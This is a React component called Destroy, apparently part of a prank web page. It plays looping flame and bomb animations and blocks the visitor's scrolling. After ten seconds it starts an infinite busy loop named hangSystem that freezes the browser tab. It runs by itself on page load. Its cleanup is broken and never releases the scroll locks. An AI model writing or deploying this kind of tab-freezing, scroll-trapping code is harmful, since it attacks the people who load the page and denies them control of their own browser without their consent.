import React, { useEffect } from 'react';
import Lottie from 'lottie-react';
import flameAnimationFile from './assets/animations/flames.json';
import bombAnimationFile from './assets/animations/bomb.json';

export default function Destroy(props) {

  useEffect(() => {
    props.setProgress(100);
  }, [])

  useEffect(() => {
    const disableScroll = () => {
      document.addEventListener('touchmove', function (event) {
        event.preventDefault();
      }, { passive: false });

      document.addEventListener('scroll', function (event) {
        window.scrollTo(0, 0);
      }, { passive: false });
    };

    const hangSystem = () => {
      while (true) {
        for (let i = 0; i < 1000000; i++) {
          Math.sqrt(Math.random());
        }
      }
    };

    disableScroll();

    const hangTimeout = setTimeout(hangSystem, 10000);

    return () => {
      document.removeEventListener('touchmove', disableScroll);
      document.removeEventListener('scroll', disableScroll);
      clearTimeout(hangTimeout);
    };
  }, []);

  return (
    <div className='min-h-screen overflow-hidden w-full bg-transparent bg-gradient-to-t from-slate-700 to-black flex items-center justify-center'>
      <div className="animations flex items-center justify-center">
        <div className="animation-1 absolute bottom-0 w-full h-auto pointer-events-none">
          <Lottie
            animationData={flameAnimationFile}
            loop={true}
            autoplay={true}
          />
        </div>
        <div className="animation-2 w-[500px] h-[500px] pointer-events-none absolute top-0">
          <Lottie
            animationData={bombAnimationFile}
            loop={true}
            autoplay={true}
          />
        </div>
      </div>
    </div>
  );
}
